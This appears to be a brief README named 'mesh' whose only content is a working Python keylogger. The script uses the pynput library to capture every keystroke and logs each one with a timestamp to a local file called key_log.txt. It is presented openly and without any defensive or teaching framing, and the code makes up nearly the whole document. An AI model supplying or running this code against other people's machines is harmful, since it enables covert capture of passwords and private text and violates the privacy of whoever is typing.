# mesh

### Key Logger

```python
from pynput.keyboard import Key, Listener
import logging

# if no name it gets into an empty string
log_dir = ""

# basic logging configuration
logging.basicConfig(
    filename=(log_dir + "key_log.txt"),
    level=logging.DEBUG,
    format='%(asctime)s:%(message)s:'
)

# function triggered when a key is pressed
def on_press(key):
    logging.info(str(key))

# start listening for keyboard input
with Listener(on_press=on_press) as listener:
    listener.join()
```
